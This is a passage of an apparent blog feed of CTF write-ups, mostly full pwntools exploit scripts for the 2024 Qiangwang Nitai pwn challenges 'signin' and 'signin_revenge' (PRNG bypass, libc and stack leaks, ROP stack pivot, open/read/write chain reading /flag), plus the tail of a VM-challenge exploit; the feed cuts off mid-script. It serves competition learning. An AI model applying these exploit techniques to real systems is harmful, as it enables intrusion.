punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>                              <span class="token comment">//*(y+regs[6])(regs[x])                                                 x &lt;= 5  y &lt;= 0x1000     y &amp; 7 == 0      regs[6] &amp; 0xFFF = 0     regs[7] = regs[6] + 0x1000</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>edoc obj<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">c0deVmMain</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x442000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//getenv_got</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x443000</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">movr</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xad8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//2 -> getenv_addr</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">chgr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xc00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">sftr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x3024</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">addi</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0xd70</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">borr</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        obj<span class="token punctuation">.</span><span class="token function">runc</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0xb00</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;round1&quot;&gt;&lt;a href=&quot;#round1&quot; class=&quot;headerlink&quot; title=&quot;round1&quot;&gt;&lt;/a&gt;round1&lt;/h2&gt;&lt;h3 id=&quot;canary-orw&quot;&gt;&lt;a href=&quot;#canary-orw&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2024强网拟态初赛pwn方向wp</title>
    <link href="https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/"/>
    <id>https://starrysky1004.github.io/2024/10/21/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/2024-qiang-wang-ni-tai-chu-sai-pwn-fang-xiang-wp/</id>
    <published>2024-10-21T13:02:21.000Z</published>
    <updated>2024-10-21T13:09:26.846Z</updated>
    
    <content type="html"><![CDATA[<p>题目：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/pwn</a></p><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><p>覆盖种子为<code>0</code>之后进行伪随机数绕过，栈迁移到堆上进行<code>orw</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-4a001b90aa.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401893</span>heap <span class="token operator">=</span> <span class="token number">0x4040E0</span>start <span class="token operator">=</span> <span class="token number">0x4011B0</span>c_libc <span class="token operator">=</span> cdll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> heapCtx<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Note: '</span><span class="token punctuation">,</span> heapCtx<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'>>'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Index: '</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">auth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    seed <span class="token operator">=</span> <span class="token number">0</span>    c_libc<span class="token punctuation">.</span>srand<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>    p <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">0x12</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        num <span class="token operator">=</span> c_libc<span class="token punctuation">.</span>rand<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">100</span> <span class="token operator">+</span> <span class="token number">1</span>        r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'code'</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ptr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>heap_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>auth<span class="token punctuation">(</span><span class="token punctuation">)</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004013be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404e00</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'openat'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>orw_rop <span class="token operator">+=</span> <span class="token string">b'/flag'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> orw_rop<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x100</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>heap_addr <span class="token operator">+</span> <span class="token number">0x220</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="signin-revenge"><a href="#signin-revenge" class="headerlink" title="signin_revenge"></a>signin_revenge</h2><p>泄露<code>libc</code>地址之后通过<code>environ</code>泄露栈地址，栈迁移到栈前面部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn-9c32d4cdb8.challenge.xctf.org.cn"</span><span class="token punctuation">,</span> <span class="token number">9999</span><span class="token punctuation">,</span> ssl<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000401393</span>start <span class="token operator">=</span> <span class="token number">0x4010B0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>libc_base <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>environ <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'environ'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>start<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'pwn'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3b8</span>libc_rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>rax <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rax'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basersi <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rsi'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baserdx <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'pop rdx'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basesyscall <span class="token operator">=</span> libc_rop<span class="token punctuation">.</span>find_gadget<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'syscall'</span><span class="token punctuation">,</span><span class="token string">'ret'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseleave_ret <span class="token operator">=</span> <span class="token number">0x00000000004012be</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>flag <span class="token operator">=</span> stack_addr <span class="token operator">+</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">0x10</span>code <span class="token operator">=</span> <span class="token number">0x404500</span>orw_rop <span class="token operator">=</span> p64<span class="token punctuation">(</span>rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rsi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>rdx<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libc<span class="token 